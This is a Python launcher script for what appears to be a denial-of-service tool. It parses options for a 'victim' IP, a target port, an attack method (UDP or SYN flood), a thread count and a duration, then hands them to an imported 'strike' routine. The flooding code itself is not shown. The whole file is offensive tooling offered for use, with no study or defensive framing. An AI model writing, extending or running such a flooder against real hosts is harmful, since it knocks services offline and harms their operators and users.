import optparse, asyncio
from savitr.zeus import strike

#sudo python3 main.py -v 127.0.0.1 -d 80 -m UDP -t 60 -p 3

usage = """\n\n

Example: -v 127.0.0.1 -d 80 -m udp -t 10 -p 6   (Does not need to be in order)

Options:
 ______________________________________________________
|                                                      |
|-v, --victim      | The IP address.                   |
|-d, --destination | The targeted Port number.         |
|-m, --method      | The attack Method.                |
|-p, --processes   | The Thread count.                 |
|-t, --time        | The attack Time length in seconds.|
|______________________________________________________|
 """

parser = optparse.OptionParser(description="User options", usage=usage)
parser.add_option(

        '-v',
        '--victim',
        action='store',
        dest='harg',
        type=str,
        help='The host IP address.'
    )
parser.add_option(

        '-d',
        '--destination',
        action='store',
        dest='darg',
        type=int,
        help='The host Port number.'
    )
parser.add_option(

        '-m',
        '--method',
        action='store',
        dest='marg',
        type=str,
        help='The attack Method.'
    )
parser.add_option(

        '-p',
        '--processes',
        action='store',
        dest='parg',
        type=int,
        help='The Thread count.'
    )
parser.add_option(

        '-t',
        '--time',
        action='store',
        dest='targ',
        type=int,
        help='The attack Time.'
    )

NULLVALUE = False

try:
    (options, args) = parser.parse_args()
except optparse.OptParseError as e:

    print ('\n[!!]\tUnable to parse arguments.')
    raise SystemExit

ARGUMENT_DIC = {

    'victim/IP address': options.harg,
    'destination/Port': options.darg,
    'method/UDP,SYN': options.marg,
    'threads': options.parg, #  -p/--processes
    'time/Seconds': options.targ
}



def main():
    'Basically checks that all parameters are filled out.'
    global NULLVALUE

    loop = asyncio.get_event_loop()

    print ('\n[*]\tYour settings\n')

    for arg_value in ARGUMENT_DIC.items():

        if arg_value[1] is not None:

            print ("{} : {}".format(arg_value[0], arg_value[1]))

        else: NULLVALUE = True

    if NULLVALUE == True:

        print('\n[!!]\tYou have a None value in a slot, please have a correct type value for each parameter.'
              '\n\nExample:\t-v 127.0.0.1 -d 80 -m UDP -t 60 -p 3'
              '\nDOES NOT HAVE TO BE IN SAME ORDER'); raise SystemExit

    loop.run_until_complete(strike(**ARGUMENT_DIC))
    loop.close()





if __name__ == '__main__':
    'execute'
    main()

